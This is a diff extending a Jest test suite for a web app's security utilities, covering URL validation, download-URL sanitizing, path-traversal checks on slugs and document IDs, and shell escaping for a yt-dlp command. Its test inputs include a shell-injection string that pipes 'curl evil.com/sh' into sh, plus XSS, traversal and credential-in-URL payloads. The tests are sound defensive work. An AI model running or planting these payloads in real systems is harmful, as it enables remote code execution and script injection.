@@ -8,7 +8,9 @@ import {
   escapeShellArg,
   maskIpAddress,
   generateSecureRandomString,
-  generateSecureId
+  generateSecureId,
+  isValidSlug,
+  sanitizeDocId
 } from '@/utils/security';
 import { getYtDlpCommand } from '@/services/mediaService';
 import { encryptPayload, decryptPayload, isEncryptedEnvelope } from '@/services/cryptoService';
@@ -45,11 +47,13 @@ describe('Security & Sanitization Utilities', () => {
       expect(isValidHttpUrl('https://example.com\nBad-Header')).toBe(false);
     });
 
-    it('rejects empty, malformed, or relative strings', () => {
+    it('rejects empty, malformed, relative, or credential-bearing URLs', () => {
       expect(isValidHttpUrl('')).toBe(false);
       expect(isValidHttpUrl('   ')).toBe(false);
       expect(isValidHttpUrl('not a url')).toBe(false);
       expect(isValidHttpUrl('/local/path')).toBe(false);
+      expect(isValidHttpUrl('https://trusted.com@evil.com/phish')).toBe(false);
+      expect(isValidHttpUrl('https://user:secret@evil.com/')).toBe(false);
     });
   });
 
@@ -65,13 +69,33 @@ describe('Security & Sanitization Utilities', () => {
       expect(sanitizeRedirectUrl('invalid')).toBeNull();
     });
 
-    it('sanitizeDownloadUrl allows safe data/blob URLs for offline files while blocking HTML/SVG/JS XSS', () => {
+    it('sanitizeDownloadUrl allows safe data/blob URLs for offline files while blocking HTML/SVG/JS XSS and non-HTTP blobs', () => {
       expect(sanitizeDownloadUrl('https://cdn.example.com/file.pdf')).toBe('https://cdn.example.com/file.pdf');
       expect(sanitizeDownloadUrl('blob:https://apps.k31.my.id/1234-5678')).toBe('blob:https://apps.k31.my.id/1234-5678');
+      expect(sanitizeDownloadUrl('blob:javascript:alert(1)')).toBeNull();
       expect(sanitizeDownloadUrl('data:text/plain;base64,SGVsbG8=')).toBe('data:text/plain;base64,SGVsbG8=');
+      expect(sanitizeDownloadUrl('data:image/png;base64,iVBORw0KGgo=')).toBe('data:image/png;base64,iVBORw0KGgo=');
       expect(sanitizeDownloadUrl('data:text/html;base64,PHNjcmlwdD4=')).toBeNull();
+      expect(sanitizeDownloadUrl('data:charset=utf-8;text/html,<script>alert(1)</script>')).toBeNull();
       expect(sanitizeDownloadUrl('data:image/svg+xml;base64,PHN2Zz4=')).toBeNull();
       expect(sanitizeDownloadUrl('javascript:alert(1)')).toBeNull();
+    });
+  });
+
+  describe('isValidSlug & sanitizeDocId Path Traversal Protection', () => {
+    it('validates URL-safe and Firestore-safe shortlink slugs', () => {
+      expect(isValidSlug('my-custom_slug123')).toBe(true);
+      expect(isValidSlug('../system/settings')).toBe(false);
+      expect(isValidSlug('slug/with/slash')).toBe(false);
+      expect(isValidSlug('slug?query=1')).toBe(false);
+      expect(isValidSlug('')).toBe(false);
+    });
+
+    it('sanitizes document IDs and replaces traversal sequences with CSPRNG IDs', () => {
+      expect(sanitizeDocId('task-12345', 'task')).toBe('task-12345');
+      expect(sanitizeDocId('../users/other/tasks', 'task')).toMatch(/^task-[a-z0-9]{10}$/);
+      expect(sanitizeDocId('..', 'note')).toMatch(/^note-[a-z0-9]{10}$/);
+      expect(sanitizeDocId('', 'habit')).toMatch(/^habit-[a-z0-9]{10}$/);
     });
   });
 
@@ -123,14 +147,16 @@ describe('Security & Sanitization Utilities', () => {
   });
 
   describe('escapeShellArg & getYtDlpCommand CLI Injection Protection', () => {
-    it('escapes shell metacharacters and strips control characters', () => {
-      const malicious = 'https://example.com/video"\r\n && curl evil.com/sh | sh # $(whoami) `id`';
+    it('escapes shell metacharacters, neutralizes %VAR% expansion, and strips control characters', () => {
+      const malicious = 'https://example.com/video%20test"\r\n && curl evil.com/sh | sh # $(whoami) `id` %COMSPEC%';
       const escaped = escapeShellArg(malicious);
       expect(escaped).not.toContain('\r');
       expect(escaped).not.toContain('\n');
       expect(escaped).toContain('\\"');
       expect(escaped).toContain('\\$');
       expect(escaped).toContain('\\`');
+      expect(escaped).toContain('%%COMSPEC%%');
+      expect(escaped).toContain('%20test');
     });
 
     it('generates safe yt-dlp command with -- option terminator and rejects non-HTTP URLs', () => {
@@ -210,7 +236,7 @@ describe('Security & Sanitization Utilities', () => {
         exportedBy: userId,
         data: {
           tasks: [
-            { id: 't-valid', title: 'Valid Task', status: 'in_progress', priority: 'high' },
+            { id: 't-valid', title: 'Valid Task', status: 'in_progress', priority: 'high', unapprovedExtraField: 'evil' },
             { id: '', title: '' }, // invalid: empty title
             null,
             'malformed-string-item'
@@ -225,7 +251,8 @@ describe('Security & Sanitization Utilities', () => {
             { id: 'f-svg', fileName: 'xss.svg', fileSize: 100, mimeType: 'image/svg+xml', downloadUrl: 'https://example.com/xss.svg' }
           ],
           shortlinks: [
-            { id: 's-safe', slug: 'my-safe-slug', originalUrl: 'https://apps.k31.my.id' },
+            { id: 's-safe', slug: 'my-safe-slug', originalUrl: 'https://apps.k31.my.id', recentClicks: 'corrupted-not-array' },
+            { id: 's-traversal', slug: '../evil-path', originalUrl: 'https://apps.k31.my.id' },
             { id: 's-xss', slug: 'bad-slug', originalUrl: 'javascript:alert(document.domain)' }
           ]
         }
@@ -234,6 +261,7 @@ describe('Security & Sanitization Utilities', () => {
       const tasks = await dataService.getTasks(userId);
       expect(tasks).toHaveLength(1);
       expect(tasks[0].title).toBe('Valid Task');
+      expect((tasks[0] as any).unapprovedExtraField).toBeUndefined();
 
       const expenses = await dataService.getExpenses(userId);
       expect(expenses).toHaveLength(1);
@@ -246,6 +274,7 @@ describe('Security & Sanitization Utilities', () => {
       const shortlinks = await dataService.getShortlinks(userId);
       expect(shortlinks).toHaveLength(1);
       expect(shortlinks[0].slug).toBe('my-safe-slug');
+      expect(shortlinks[0].recentClicks).toBeUndefined();
     });
   });
 });
